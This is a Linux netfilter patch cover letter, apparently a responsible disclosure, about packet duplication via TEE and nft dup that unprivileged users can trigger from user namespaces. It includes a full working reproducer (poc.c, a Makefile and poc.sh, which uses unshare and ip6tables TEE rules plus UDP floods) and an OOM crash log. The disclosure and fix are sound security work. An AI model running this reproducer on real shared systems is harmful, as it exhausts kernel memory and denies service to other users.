Received: from mail-pg1-f172.google.com (mail-pg1-f172.google.com [209.85.215.172])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 40A735013A4
	for <netfilter-devel@vger.kernel.org>; Tue, 29 Sep 2026 12:58:41 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.172
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790686724; cv=none; b=XQNwjklIg7F71g4WD8U9HdaGBayIApJ+DMjL8qpAemPEOzt1jPC2/fBoEYmQD6FGVPo5rS+9gv2Qvct8Debie3468b1RSPIwUcLynuaPoFOQuykIJB+734G9Hw0/a4O/JL6RbLT8tsMs8T2BQEBhOwqqaCnjy+ibYeQq92hrbAg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790686724; c=relaxed/simple;
	bh=S92yZCgkiw92MT+o15EoCsymN19/OvVgh6dSLs3ssR8=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=jTMcoHoTocHLVc10p7tTl2eyLpfh8OA/hUjLmXZ5iApsbdbJIQ6kYvKEN+KREQS8TNoNuR5tvlt4Oon6nU5v6gpDDIoMcbwZ3RcswpY/oiuy+WGp7BGdZSWTdQ+hndHDPfiACbthuuLuogtYbUiUhZmY1DSJphlcmIuQ+DAQlxM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=MFGYfuZ4; arc=none smtp.client-ip=209.85.215.172
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="MFGYfuZ4"
Received: by mail-pg1-f172.google.com with SMTP id 41be03b00d2f7-cc147d86bebso429346a12.0
        for <netfilter-devel@vger.kernel.org>; Tue, 29 Sep 2026 05:58:41 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790686720; x=1791291520; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=qF6Rs6pWq9SMxFGZR+XHba88IK0p2Vjd0gVFojTzvGM=;
        b=MFGYfuZ4LbhK3rEfe3O1wdTjjQR6rlDMXLflQo69+blBooYkTAYk0hN64YrezCav45
         ikpeufAZfM4WG6ujklSuIk76f9SB8fBpRsAXIDpjsXzTjpLi1umrPgVfjnxqsR8cvw4s
         52W3pAHaZC+k2/DPdJIUdgA/b6zHXnfqwJ4MyBnyj5OlI/tMTFKoZvLxUnY83U3RXGGk
         pdTv3/SUs8h1ZnJpMH2D2GInPJd+DtBDXTbGFGIHf3pgvwOxY2lEY079LdV+3kH5pt+q
         v3oaHGtsaRYAPfo5wCE2q6aSM14K9JBJFHdzrg+NBkOJPLwANYnsCw2HPAJ40TbjQUwi
         I36A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790686720; x=1791291520;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=qF6Rs6pWq9SMxFGZR+XHba88IK0p2Vjd0gVFojTzvGM=;
        b=xHUcBt+7DgmNc1GcwJhgatZbGkRV25wtWAw0qipfu4mnMCI9H4ACMFCVq6MywmUPOD
         0jWp26S/rU251g+PZT9/CRJxIs6x/Dn1eCZMKlJ7koOFUdXrb3mHFH2+v+MahyuZ52C6
         pAStIo1cVglpeBlurU7Tywe373HTkGel/jn+awiJv29x7uD6GXEGXmytlTTZM0x5XVIn
         tEDdmsXkRI06NsQQxonPzyFMztd5gttarRx4mWHrdD48e8X2Fm5zR5duy6iMmuqKc3xV
         POizYK9Bp4B0ueA1gpaf6bRVqc1R9ls2stA+HpyDhMNOcdgaT74jMbRsDfBplCAt4MFe
         bZtw==
X-Gm-Message-State: AFuF++mfDE8w/LW90QcneOsPxj02uy7STQkjQqxYrRkzxdh56fpPYLd4
	8pf4kt3dXlIPOaEqiyBWXlvE8YIPp9T4SDdQ/qdCGbBiBOOJGeS5q18Wl1rn8kGwgmVVLVvBJo7
	8CcaMBLEZ
X-Gm-Gg: AYBFou3XM81Z3XunY83TeMT7F5vMWLyxLC6fp7yWknQYVU6QrbAWtK0UZjrbj7K1bXi
	Hn2k8NTyzKAswmRn8a+A4kWPe9SQ+Qay4Q7QssIxPf7Kz985idYbmcOGlSMhsvD7ONmP6tTLsbc
	0PGYSGCrnFBfO/p3i0uBtKmOVG0d82UIap3CWRZ/XJ+7k/wwcvVo3ZsXAEcUFtWNtRUCmr3mGBg
	oODhK0xMERY/HE2fwkqfoXV+XTkSnX2lzjM2rDaaerbitW2hVdp7DE2yswSn7MSGSBhOFIuzq1M
	TL6wkyvv9dD6ANXHbsGXnIh+y8qK7rNPgLcvcJYC1v42xC9TzNMaWRscS0pb96oiRDkrKY3+xst
	ei8DqcndTls2/St0S7q8qlr+AImejsrGbYS9SL51uytGxq+xm7PvZwDcKDrGpmI9BXrwNV7fCDd
	eNuPqo+LNg9fxv5W+hs3NGSguGJrVX9p3NkGVrRfy5dCBJdJz4fyFkbySBwEqCRL9nABWRH6L28
	VE/JzxlOeV4tYTiwIRPanetWPbEqw==
X-Received: by 2002:a05:6a20:ed02:10b0:3de:80ed:2a0e with SMTP id adf61e73a8af0-3de80ed2b2bmr894660637.12.1790686720159;
        Tue, 29 Sep 2026 05:58:40 -0700 (PDT)
Received: from 954df21a5119.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc78794aa7fsm6180113a12.24.2026.09.29.05.58.37
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 29 Sep 2026 05:58:39 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netfilter-devel@vger.kernel.org
Cc: fw@strlen.de,
	pablo@netfilter.org,
	phil@nwl.cc,
	netdev@vger.kernel.org,
	zihanx@nebusec.ai
Subject: [PATCH nf v5 0/1] netfilter: nf_dup: reject TEE and IPv4/IPv6/netdev nft dup in userns
Date: Tue, 29 Sep 2026 12:58:31 +0000
Message-ID: <20260929125832.25316-1-zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a packet-duplication resource-consumption issue
affecting the TEE and IPv4/IPv6/netdev nft dup frontends. The patch changes
four setup files:

    net/ipv4/netfilter/nft_dup_ipv4.c
    net/ipv6/netfilter/nft_dup_ipv6.c
    net/netfilter/nft_dup_netdev.c
    net/netfilter/xt_TEE.c

With unprivileged user namespaces enabled, a non-root process can obtain
CAP_NET_ADMIN in a network namespace owned by a non-initial user namespace
and configure the affected rules. The patch rejects all five frontends
during setup there. It does not change packet-processing paths or behavior in
init_user_ns-owned network namespaces.

We will provide detailed information about the bug in this email, along with
a PoC to trigger it.

---- details below ----

Bug details:

The existing recursion protection does not cover every asynchronous packet-
processing context. Repeated packet duplication can consume packet-processing
resources. This patch leaves the packet-processing paths unchanged and
rejects TEE and IPv4/IPv6/netdev nft dup rule or expression setup with -EPERM
in network namespaces owned by a non-initial user namespace.

This is a namespace-specific restriction, not a general repair of the
asynchronous duplication behavior. Rules remain installable in
init_user_ns-owned network namespaces, where the existing behavior is
unchanged. The reported impact is resource consumption; this report does not
claim memory-safety impact or privilege escalation.

Reproducer:

    # as guest root, before the unprivileged baseline run
    sysctl -w vm.panic_on_oom=0

    # as an unprivileged user, on the unpatched baseline
    PANIC_ON_OOM=0 QUEUE_COUNT=1 TEE_CLONES=1 PAYLOAD=1 \
        timeout --signal=TERM --kill-after=2s 5s bash ./poc.sh --userns

The command overrides poc.sh defaults (QUEUE_COUNT=18, TEE_CLONES=2,
PAYLOAD=60000). The included poc.sh builds the NFQUEUE receiver with the
Makefile, installs the IPv6 rules, and sends traffic. On the v5 patched
kernel, the same user-namespace PoC was rejected while installing the TEE
rule, before any traffic was sent:

    ip6tables: Operation not permitted.
    PATCHED_POC_PASS: TEE rule rejected with EPERM before traffic

The four-file v5 source diff was built as an x86_64 bzImage and booted in a 2 vCPU, 2 GB
RAM QEMU guest. A separate rule-setup test confirmed that all five frontends
are accepted in init_user_ns and rejected with -EPERM in a non-initial-user-
namespace-owned network namespace. It validates setup policy only; it does
not exercise packet processing after rule installation. The separate test
harness is not part of this 0/1 series.

    POLICY_TEST_PASS: all five frontends preserve init-userns support and reject userns setup

No v5 crash log was produced for the patched PoC: it stopped at rule setup before
sending packets. The decoded OOM log below is from a separate guest-root run
with vm.panic_on_oom=1, not from the unprivileged user-namespace run or the
v5 patched test. The run harness recorded image SHA-256

dfbad788ca12604efccf39a8a3c65cdb6ded7be8cab26097160b44969167810e

and a matching build record associates that image with selected baseline
revision 9c572a83037a7dcd653ba3a9cc468c16b857d0c9. The v4+ release suffix in
the boot banner is not used as source-tree provenance. The OOM stack is not
direct call-stack evidence of the packet-duplication path and does not show
that an unprivileged user can panic the host.

packetdrill was not used because this reproducer requires network-namespace
and netfilter-rule setup plus a userspace NFQUEUE verdict service. packetdrill
does not provide that verdict service. The PoC and its helper files below are
the actual local reproducer files.

changes in v5:
  - describe the patch as a non-initial-userns setup restriction, not a
    general recursion fix; state that init_user_ns behavior is unchanged
  - remove path-specific trigger details and run-specific metrics from the
    public commit and cover prose
  - drop d877f07112f1 from Fixes: because it added a later frontend, not the
    shared duplication behavior addressed by this restriction
  - record the v5 build and setup-time validation, distinguishing them from
    earlier unpatched-baseline and root-OOM runs
  - v4 Link:
    https://lore.kernel.org/all/cover.1790408011.git.zihanx@nebusec.ai/
changes in v4:
  - add Fixes tags for TEE, IPv4/IPv6 nft dup, and netdev nft dup
    frontends
  - clarify that fcd53c51d037 only added a synchronous guard
  - clarify that this restricts non-initial user namespaces and does not
    fix asynchronous recursion in init_user_ns-owned network namespaces
  - state explicitly that the netdev loop was not runtime-reproduced
  - v3 Link:
    https://lore.kernel.org/all/cover.1790042930.git.zihanx@nebusec.ai/
changes in v3:
  - reroll the fix against the latest nf.git main after no follow-up on v2
  - add the Co-developed-by trailer and matching Signed-off-by
  - v2 Link:
    https://lore.kernel.org/all/cover.1788425393.git.zihanx@nebusec.ai/
changes in v2:
  - drop the persistent struct sk_buff::nf_duplicated field and nf_copy()
    change from v1
  - disable IPv4/IPv6 duplication in non-initial user namespaces
  - v1 Link:
    https://lore.kernel.org/all/cover.1787903722.git.zihanx@nebusec.ai/

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/netfilter.h>
#include <linux/netlink.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include <libnetfilter_queue/libnetfilter_queue.h>

static volatile sig_atomic_t stop;
static uint64_t packets_seen;
static uint64_t last_report;
static struct timespec start_ts;

static void on_signal(int signo)
{
	(void)signo;
	stop = 1;
}

static void report_progress(bool force)
{
	struct timespec now;
	double seconds;

	if (!force && packets_seen - last_report < 1000)
		return;

	if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
		return;

	seconds = (now.tv_sec - start_ts.tv_sec) +
		  (now.tv_nsec - start_ts.tv_nsec) / 1000000000.0;
	fprintf(stderr, "accepted=%llu elapsed=%.3f rate=%.0f pkt/s\n",
		(unsigned long long)packets_seen, seconds,
		seconds > 0.0 ? packets_seen / seconds : 0.0);
	last_report = packets_seen;
}

static int queue_cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
		    struct nfq_data *nfa, void *data)
{
	struct nfqnl_msg_packet_hdr *ph;
	uint32_t id = 0;

	(void)nfmsg;
	(void)data;

	ph = nfq_get_msg_packet_hdr(nfa);
	if (ph)
		id = ntohl(ph->packet_id);

	packets_seen++;
	report_progress(false);

	return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
}

int main(int argc, char **argv)
{
	struct nfq_handle *h = NULL;
	struct nfq_q_handle *qh = NULL;
	int fd;
	int queue_num = 0;
	int rv;
	int ret = 1;
	int one = 1;
	int rcvbuf = 512 * 1024 * 1024;
	unsigned int maxlen = 65535;
	char buf[8192] __attribute__((aligned));

	if (argc > 2) {
		fprintf(stderr, "usage: %s [queue-num]\n", argv[0]);
		return 2;
	}
	if (argc == 2)
		queue_num = atoi(argv[1]);

	signal(SIGINT, on_signal);
	signal(SIGTERM, on_signal);

	if (clock_gettime(CLOCK_MONOTONIC, &start_ts) != 0) {
		perror("clock_gettime");
		return 1;
	}

	h = nfq_open();
	if (!h) {
		perror("nfq_open");
		goto out;
	}

	if (nfq_unbind_pf(h, AF_INET6) < 0)
		fprintf(stderr, "warning: nfq_unbind_pf(AF_INET6) failed\n");

	if (nfq_bind_pf(h, AF_INET6) < 0) {
		perror("nfq_bind_pf(AF_INET6)");
		goto out;
	}

	qh = nfq_create_queue(h, (uint16_t)queue_num, queue_cb, NULL);
	if (!qh) {
		perror("nfq_create_queue");
		goto out;
	}

	if (nfq_set_mode(qh, NFQNL_COPY_META, 0) < 0) {
		perror("nfq_set_mode");
		goto out;
	}

	if (nfq_set_queue_maxlen(qh, maxlen) < 0)
		fprintf(stderr, "warning: nfq_set_queue_maxlen(%u) failed\n", maxlen);

	fd = nfq_fd(h);
	if (setsockopt(fd, SOL_SOCKET, SO_RCVBUFFORCE, &rcvbuf,
		       sizeof(rcvbuf)) < 0 &&
	    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0)
		fprintf(stderr, "warning: socket receive buffer setup failed: %s\n",
			strerror(errno));
	if (setsockopt(fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &one, sizeof(one)) < 0)
		fprintf(stderr, "warning: NETLINK_NO_ENOBUFS failed: %s\n",
			strerror(errno));

	while (!stop) {
		rv = recv(fd, buf, sizeof(buf), 0);
		if (rv >= 0) {
			if (nfq_handle_packet(h, buf, rv) < 0) {
				perror("nfq_handle_packet");
				break;
			}
			continue;
		}

		if (errno == EINTR)
			continue;
		if (errno == ENOBUFS)
			continue;

		perror("recv");
		break;
	}

	report_progress(true);
	ret = 0;

out:
	if (qh)
		nfq_destroy_queue(qh);
	if (h)
		nfq_close(h);
	return ret;
}
------END poc.c--------

------BEGIN Makefile------
CC ?= gcc
CFLAGS ?= -O2 -Wall -Wextra
LDLIBS ?= -lnetfilter_queue -lnfnetlink

all: poc

poc: poc.c

clean:
	rm -f poc
------END Makefile--------

------BEGIN poc.sh------
#!/bin/bash
set -euo pipefail

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
IP=/usr/sbin/ip
IP6TABLES=/usr/sbin/ip6tables-legacy
SYSCTL=/usr/sbin/sysctl
export XTABLES_LOCKFILE=${XTABLES_LOCKFILE:-$SCRIPT_DIR/xtables.lock}
QUEUE_COUNT=${QUEUE_COUNT:-18}
BASE_PORT=${BASE_PORT:-5555}
PAYLOAD=${PAYLOAD:-60000}
TEE_CLONES=${TEE_CLONES:-2}
PANIC_ON_OOM=${PANIC_ON_OOM:-1}
PANIC_ON_WARN=${PANIC_ON_WARN:-0}

if [[ ${1-} == "--userns" ]]; then
	exec unshare -Urn -- "$0" --inside-userns
fi

if [[ ${1-} == "--inside-userns" ]]; then
	shift
fi

cleanup() {
	"$IP6TABLES" -t raw -F OUTPUT 2>/dev/null || true
	"$IP6TABLES" -t mangle -F OUTPUT 2>/dev/null || true
	for pid in "${acceptor_pids[@]-}"; do
		kill "$pid" 2>/dev/null || true
	done
	for pid in "${acceptor_pids[@]-}"; do
		wait "$pid" 2>/dev/null || true
	done
}
trap cleanup EXIT

"$IP" link set lo up
"$SYSCTL" -q -w kernel.panic_on_warn="$PANIC_ON_WARN" || true
"$SYSCTL" -q -w vm.panic_on_oom="$PANIC_ON_OOM" || true
"$SYSCTL" -q -w net.core.rmem_max=536870912 || true
"$SYSCTL" -q -w net.core.rmem_default=536870912 || true
"$SYSCTL" -q -w net.netfilter.nf_queue_maxlen=65535 || true

make -C "$SCRIPT_DIR" clean all

"$IP6TABLES" -t raw -F OUTPUT
"$IP6TABLES" -t mangle -F OUTPUT

acceptor_pids=()

for q in $(seq 0 $((QUEUE_COUNT - 1))); do
	port=$((BASE_PORT + q))

	"$IP6TABLES" -t raw -A OUTPUT \
		-p udp -d ::1 --dport "$port" \
		-j NFQUEUE --queue-num "$q"

	for _ in $(seq 1 "$TEE_CLONES"); do
		"$IP6TABLES" -t mangle -A OUTPUT \
			-p udp -d ::1 --dport "$port" \
			-j TEE --gateway ::1 --oif lo
	done

	"$SCRIPT_DIR/poc" "$q" >"$SCRIPT_DIR/acceptor-$q.log" 2>&1 &
	acceptor_pids+=("$!")
done
sleep 1

python3 - "$BASE_PORT" "$QUEUE_COUNT" "$PAYLOAD" <<'PY'
import socket
import sys

base_port = int(sys.argv[1])
queue_count = int(sys.argv[2])
payload_len = int(sys.argv[3])

s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
for offset in range(queue_count):
	dport = base_port + offset
	s.sendto(b"A" * payload_len, ("::1", dport))
	print("sent", payload_len, "bytes to ::1", dport)
PY

echo "PoC is active. Queue state:"
cat /proc/net/netfilter/nfnetlink_queue 2>/dev/null || true

wait
------END poc.sh--------
----BEGIN crash log----
Separate guest-root run:

    make clean all
    sysctl -w vm.panic_on_oom=1
    PANIC_ON_OOM=1 QUEUE_COUNT=18 TEE_CLONES=2 PAYLOAD=60000 bash ./poc.sh

[   18.785356] in:imklog invoked oom-killer: gfp_mask=0x140cca(GFP_HIGHUSER_MOVABLE|__GFP_COMP), order=0, oom_score_adj=0
[   18.785362] CPU: 0 UID: 0 PID: 151 Comm: in:imklog Not tainted 7.3.0-rc3-nfdup-userns-v4+ #1 PREEMPT(lazy) 
[   18.785364] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   18.785365] Call Trace:
[   18.785367]  <TASK>
[   18.785369]  dump_stack_lvl (??:?)
[   18.785374]  dump_header (oom_kill.c:?)
[   18.785376]  out_of_memory (??:?)
[   18.785378]  __alloc_frozen_pages_noprof (??:?)
[   18.785381]  ? blk_finish_plug (??:?)
[   18.785384]  alloc_pages_mpol (mempolicy.c:?)
[   18.785387]  folio_alloc_noprof (??:?)
[   18.785389]  __filemap_get_folio_mpol (??:?)
[   18.785391]  filemap_fault (??:?)
[   18.785392]  __do_fault (memory.c:?)
[   18.785395]  __handle_mm_fault (memory.c:?)
[   18.785397]  handle_mm_fault (??:?)
[   18.785399]  do_user_addr_fault (fault.c:?)
[   18.785402]  exc_page_fault (??:?)
[   18.785404]  asm_exc_page_fault (??:?)
[   18.785406] RIP: 0033:0x7fc1cf0de492
[   18.785408] Code: 89 07 31 c0 c3 0f 1f 00 41 54 55 53 48 8b 2f 80 7d 00 3c 75 73 49 89 fc 48 89 f3 e8 c8 fe ff ff 4c 8b 00 0f b6 45 01 48 89 c2 <41> f6 44 40 01 08 74 56 48 8d 4d 01 31 c0 eb 0c 66 0f 1f 44 00 00
All code
========
   0:	89 07                	mov    %eax,(%rdi)
   2:	31 c0                	xor    %eax,%eax
   4:	c3                   	ret
   5:	0f 1f 00             	nopl   (%rax)
   8:	41 54                	push   %r12
   a:	55                   	push   %rbp
   b:	53                   	push   %rbx
   c:	48 8b 2f             	mov    (%rdi),%rbp
   f:	80 7d 00 3c          	cmpb   $0x3c,0x0(%rbp)
  13:	75 73                	jne    0x88
  15:	49 89 fc             	mov    %rdi,%r12
  18:	48 89 f3             	mov    %rsi,%rbx
  1b:	e8 c8 fe ff ff       	call   0xfffffffffffffee8
  20:	4c 8b 00             	mov    (%rax),%r8
  23:	0f b6 45 01          	movzbl 0x1(%rbp),%eax
  27:	48 89 c2             	mov    %rax,%rdx
  2a:*	41 f6 44 40 01 08    	testb  $0x8,0x1(%r8,%rax,2)		<-- trapping instruction
  30:	74 56                	je     0x88
  32:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
  36:	31 c0                	xor    %eax,%eax
  38:	eb 0c                	jmp    0x46
  3a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

Code starting with the faulting instruction
===========================================
   0:	41 f6 44 40 01 08    	testb  $0x8,0x1(%r8,%rax,2)
   6:	74 56                	je     0x5e
   8:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
   c:	31 c0                	xor    %eax,%eax
   e:	eb 0c                	jmp    0x1c
  10:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
[   18.785409] RSP: 002b:00007fc1cebf53e0 EFLAGS: 00010203
[   18.785410] RAX: 0000000000000034 RBX: 00007fc1cebf540c RCX: 0000000000000000
[   18.785411] RDX: 0000000000000034 RSI: 00007fc1cebf540c RDI: 00007fc1cebf5400
[   18.785412] RBP: 00007fc1cebf5d00 R08: 00007fc1cf5243c0 R09: 0000560c44c3be68
[   18.785412] R10: a3d70a3d70a3d70b R11: 0000000000000000 R12: 00007fc1cebf5400
[   18.785413] R13: 0000560c44c3f4a0 R14: 00007fc1cebf5d00 R15: 00007fc1cebf5d86
[   18.785414]  </TASK>
[   18.785414] Mem-Info:
[   18.785415] active_anon:50 inactive_anon:12058 isolated_anon:0
[   18.785415]  active_file:365 inactive_file:658 isolated_file:26
[   18.785415]  unevictable:0 dirty:6 writeback:0
[   18.785415]  slab_reclaimable:2018 slab_unreclaimable:482856
[   18.785415]  mapped:679 shmem:58 pagetables:1008
[   18.785415]  sec_pagetables:0 bounce:0
[   18.785415]  kernel_misc_reclaimable:0
[   18.785415]  free:4066 free_pcp:164 free_cma:0
[   18.785418] Node 0 active_anon:200kB inactive_anon:48232kB active_file:1460kB inactive_file:2632kB unevictable:0kB isolated(anon):0kB isolated(file):104kB mapped:2716kB dirty:24kB writeback:0kB shmem:232kB kernel_stack:1984kB pagetables:4032kB sec_pagetables:0kB all_unreclaimable? no Balloon:0kB gpu_active:0kB gpu_reclaim:0kB
[   18.785420] Node 0 DMA free:7864kB boost:0kB min:40kB low:52kB high:64kB reserved_highatomic:0kB free_highatomic:0kB active_anon:0kB inactive_anon:0kB active_file:8kB inactive_file:0kB unevictable:0kB writepending:8kB zspages:0kB present:15992kB managed:15360kB mlocked:0kB bounce:0kB free_pcp:12kB local_pcp:12kB free_cma:0kB
[   18.785423] lowmem_reserve[]: 0 1959 1959 1959
[   18.785425] Node 0 DMA32 free:8400kB boost:14452kB min:20088kB low:22088kB high:24088kB reserved_highatomic:0kB free_highatomic:0kB active_anon:200kB inactive_anon:48232kB active_file:1448kB inactive_file:2632kB unevictable:0kB writepending:24kB zspages:0kB present:2080628kB managed:2006712kB mlocked:0kB bounce:0kB free_pcp:644kB local_pcp:644kB free_cma:0kB
[   18.785427] lowmem_reserve[]: 0 0 0 0
[   18.785429] Node 0 DMA: 1*4kB (U) 2*8kB (UM) 0*16kB 1*32kB (M) 2*64kB (UM) 2*128kB (UM) 1*256kB (M) 2*512kB (UM) 2*1024kB (UM) 0*2048kB 1*4096kB (M) = 7860kB
[   18.785435] Node 0 DMA32: 148*4kB (M) 88*8kB (UM) 44*16kB (UM) 26*32kB (UM) 17*64kB (M) 23*128kB (UME) 6*256kB (ME) 0*512kB 0*1024kB 0*2048kB 0*4096kB = 8400kB
[   18.785440] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB
[   18.785441] 1131 total pagecache pages
[   18.785441] 0 pages in swap cache
[   18.785442] Free swap  = 0kB
[   18.785442] Total swap = 0kB
[   18.785442] 524155 pages RAM
[   18.785443] 0 pages HighMem/MovableOnly
[   18.785443] 18637 pages reserved
[   18.785443] Unreclaimable slab info:
[   18.785444] Name                      Used          Total
[   18.785445] UDPv6                     34KB         63KB
[   18.785446] TCPv6                     29KB         31KB
[   18.785447] bio-120                   15KB         16KB
[   18.785448] mqueue_inode_cache         24KB         31KB
[   18.785449] UNIX                      63KB         63KB
[   18.785450] RAW                       14KB         15KB
[   18.785450] UDP                       63KB         63KB
[   18.785450] request_sock_TCP           8KB         11KB
[   18.785451] TCP                       27KB         30KB
[   18.785452] hugetlbfs_inode_cache         31KB         31KB
[   18.785452] netfs_request             70KB         75KB
[   18.785453] bio-272                   26KB         26KB
[   18.785454] bio-248                    7KB          8KB
[   18.785454] request_queue             24KB         30KB
[   18.785455] bio-184                   90KB         90KB
[   18.785456] user_namespace            52KB         63KB
[   18.785456] skbuff_head_cache     407502KB     407504KB
[   18.785457] taskstats                 37KB         46KB
[   18.785458] seq_file                  13KB         15KB
[   18.785458] shmem_inode_cache        464KB        470KB
[   18.785460] kernfs_node_cache       1673KB       1701KB
[   18.785460] mnt_cache                 63KB         63KB
[   18.785461] filp                     146KB        149KB
[   18.785462] net_namespace             16KB         28KB
[   18.785462] avtab_extended_perms          4KB          7KB
[   18.785463] avtab_node              3151KB       3151KB
[   18.785464] key_jar                   14KB         16KB
[   18.785464] uts_namespace             42KB         47KB
[   18.785465] vm_area_struct           888KB        889KB
[   18.785465] files_cache          1120672KB    1120673KB
[   18.785466] signal_cache             162KB        173KB
[   18.785466] sighand_cache            272KB        278KB
[   18.785467] task_struct              586KB        586KB
[   18.785467] anon_vma                 174KB        177KB
[   18.785468] Acpi-ParseExt              6KB          7KB
[   18.785468] Acpi-State                56KB         59KB
[   18.785469] numa_policy               22KB         23KB
[   18.785472] ftrace_event_field        744KB        790KB
[   18.785477] maple_node               238KB        352KB
[   18.785477] mm_struct                141KB        151KB
[   18.785478] vmap_area                110KB        114KB
[   18.785479] kmalloc-8k               352KB        352KB
[   18.785479] kmalloc-4k               704KB        704KB
[   18.785479] kmalloc-2k               744KB        768KB
[   18.785480] kmalloc-1k               468KB        480KB
[   18.785480] kmalloc-512              554KB        560KB
[   18.785481] kmalloc-256           206387KB     206388KB
[   18.785481] kmalloc-128              159KB        160KB
[   18.785484] kmalloc-64              1264KB       1284KB
[   18.785484] kmalloc-32               174KB        176KB
[   18.785485] kmalloc-16               157KB        160KB
[   18.785485] kmalloc-8                 45KB         48KB
[   18.785486] kmalloc-192           153097KB     153097KB
[   18.785487] kmalloc-96               511KB        519KB
[   18.785488] kmem_cache_node            8KB         12KB
[   18.785488] kmem_cache                32KB         36KB
[   18.785489] Tasks state (memory values in pages):
[   18.785489] [  pid  ]   uid  tgid total_vm      rss rss_anon rss_file rss_shmem pgtables_bytes swapents oom_score_adj name
[   18.785496] [     92]     0    92     8002      328      205      122         1    81920        0          -250 systemd-journal
[   18.785499] [    112]     0   112     8919     2641     2527      114         0    94208        0         -1000 systemd-udevd
[   18.785502] [    114]     0   114     8853     2567     2464      103         0    77824        0             0 systemd-udevd
[   18.785503] [    115]     0   115     8853     2568     2465      103         0    90112        0             0 systemd-udevd
[   18.785505] [    116]     0   116     8853     2568     2465      103         0    77824        0             0 systemd-udevd
[   18.785506] [    117]     0   117     8853     2572     2469      103         0    98304        0             0 systemd-udevd
[   18.785508] [    118]     0   118     8853     2568     2465      103         0    77824        0             0 systemd-udevd
[   18.785509] [    119]     0   119     8853     2569     2466      103         0    77824        0             0 systemd-udevd
[   18.785510] [    120]     0   120     8853     2571     2468      103         0    77824        0             0 systemd-udevd
[   18.785512] [    121]     0   121     8853     2571     2468      103         0    77824        0             0 systemd-udevd
[   18.785513] [    122]     0   122     8853     2571     2468      103         0    90112        0             0 systemd-udevd
[   18.785514] [    123]     0   123     9139     2847     2744      103         0    77824        0             0 systemd-udevd
[   18.785516] [    124]     0   124     8853     2591     2488      103         0    90112        0             0 systemd-udevd
[   18.785517] [    125]     0   125     8853     2591     2488      103         0    77824        0             0 systemd-udevd
[   18.785518] [    126]     0   126     8853     2591     2488      103         0    77824        0             0 systemd-udevd
[   18.785520] [    127]     0   127     8853     2590     2487      103         0    90112        0             0 systemd-udevd
[   18.785521] [    128]     0   128     8853     2591     2488      103         0    77824        0             0 systemd-udevd
[   18.785523] [    136]     0   136     1411      117       68       49         0    57344        0             0 cron
[   18.785524] [    142]     0   142    55235      336      292       44         0    77824        0             0 rsyslogd
[   18.785526] [    177]     0   177    24973      680      340      340         0    77824        0             0 dhclient
[   18.785528] [    207]     0   207      720       75       33       42         0    45056        0             0 agetty
[   18.785530] [    208]     0   208      720       81       33       48         0    45056        0             0 agetty
[   18.785531] [    211]     0   211      720       80       32       48         0    53248        0             0 agetty
[   18.785533] [    213]     0   213      720       81       33       48         0    40960        0             0 agetty
[   18.785534] [    214]     0   214      720       80       32       48         0    40960        0             0 agetty
[   18.785536] [    215]     0   215      720       72       32       40         0    45056        0             0 agetty
[   18.785537] [    216]     0   216     1101       82       34       48         0    45056        0             0 agetty
[   18.785539] [    219]     0   219     3340      556      245      311         0    65536        0         -1000 sshd
